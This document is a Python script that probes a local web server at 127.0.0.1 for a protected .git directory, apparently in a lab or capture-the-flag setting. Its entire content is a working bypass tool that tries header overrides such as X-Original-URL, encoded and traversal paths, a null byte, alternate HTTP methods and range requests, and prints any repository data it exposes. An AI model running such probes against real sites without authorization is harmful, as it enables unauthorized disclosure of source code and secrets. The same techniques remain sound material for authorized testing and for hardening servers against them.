import requests

target = "http://127.0.0.1:32867"

print("[*] Testing Advanced .git Bypass Techniques")
print("=" * 70)

# ============================================================================
# 1. HTTP HEADER MANIPULATION
# ============================================================================
print("\n[1] HTTP HEADER MANIPULATION")
print("-" * 70)

header_tests = [
    ("X-Original-URL", "/.git/HEAD"),
    ("X-Rewrite-URL", "/.git/HEAD"),
    ("X-Original-URL", ".git/HEAD"),
]

for header_name, header_value in header_tests:
    headers = {header_name: header_value}
    resp = requests.get(f"{target}/.git/HEAD", headers=headers, timeout=5)
    
    content_type = resp.headers.get('Content-Type', '')
    is_html = 'text/html' in content_type
    
    print(f"[*] Header: {header_name}: {header_value}")
    print(f"    Status: {resp.status_code} | Content-Type: {content_type}")
    
    if resp.status_code == 200:
        if 'ref:' in resp.text or 'refs/heads' in resp.text:
            print(f"    [!] VALID GIT DATA FOUND!")
            print(f"    Content: {resp.text}")
        elif not is_html and len(resp.text) < 500:
            print(f"    Content: {resp.text[:200]}")
    print()

# Test with Accept header
print("[*] Testing Accept headers")
accept_headers = [
    "application/octet-stream",
    "text/plain",
    "*/*"
]

for accept in accept_headers:
    headers = {"Accept": accept}
    resp = requests.get(f"{target}/.git/HEAD", headers=headers, timeout=5)
    
    print(f"[*] Accept: {accept}")
    print(f"    Status: {resp.status_code} | Content-Type: {resp.headers.get('Content-Type', '')}")
    
    if resp.status_code == 200 and ('ref:' in resp.text or 'refs/heads' in resp.text):
        print(f"    [!] VALID GIT DATA FOUND!")
        print(f"    Content: {resp.text}")
    elif resp.status_code == 200 and len(resp.text) < 500:
        print(f"    Content preview: {resp.text[:150]}")
    print()

# ============================================================================
# 2. PATH ENCODING VARIATIONS
# ============================================================================
print("\n[2] PATH ENCODING VARIATIONS")
print("-" * 70)

path_tests = [
    ("Double URL encode", "/%252egit/HEAD"),
    ("Dot encoding", "/.%2egit/HEAD"),
    ("Path traversal", "/test/../.git/HEAD"),
    ("Null byte", "/.git%00/HEAD"),
    ("Uppercase", "/.GIT/HEAD"),
    ("Mixed case", "/.Git/HEAD"),
    ("URL encode full", "/%2e%67%69%74/HEAD"),
    ("Backslash", "/.git\\HEAD"),
    ("Double slash", "//.git/HEAD"),
    ("Question mark", "/.git/HEAD?"),
]

for name, path in path_tests:
    resp = requests.get(f"{target}{path}", timeout=5)
    
    print(f"[*] {name}: {path}")
    print(f"    Status: {resp.status_code}")
    
    if resp.status_code == 200:
        content_type = resp.headers.get('Content-Type', '')
        is_html = 'text/html' in content_type
        
        if 'ref:' in resp.text or 'refs/heads' in resp.text:
            print(f"    [!] VALID GIT DATA FOUND!")
            print(f"    Content: {resp.text}")
        elif not is_html and len(resp.text) < 500:
            print(f"    Content-Type: {content_type}")
            print(f"    Content: {resp.text[:200]}")
    print()

# ============================================================================
# 3. DIFFERENT HTTP METHODS
# ============================================================================
print("\n[3] DIFFERENT HTTP METHODS")
print("-" * 70)

methods = ['POST', 'HEAD', 'OPTIONS', 'PUT']

for method in methods:
    resp = requests.request(method, f"{target}/.git/HEAD", timeout=5)
    
    print(f"[*] Method: {method}")
    print(f"    Status: {resp.status_code}")
    
    if resp.status_code == 200 and resp.text:
        if 'ref:' in resp.text:
            print(f"    [!] VALID GIT DATA FOUND!")
            print(f"    Content: {resp.text}")
        elif len(resp.text) < 500:
            print(f"    Content: {resp.text[:200]}")
    print()

# ============================================================================
# 4. RANGE REQUESTS
# ============================================================================
print("\n[4] RANGE REQUESTS")
print("-" * 70)

resp = requests.get(f"{target}/.git/HEAD", headers={"Range": "bytes=0-100"}, timeout=5)
print(f"[*] Range: bytes=0-100")
print(f"    Status: {resp.status_code}")
if resp.status_code in [200, 206]:
    print(f"    Content: {resp.text}")
    if 'ref:' in resp.text:
        print(f"    [!] VALID GIT DATA FOUND!")

print("\n" + "=" * 70)

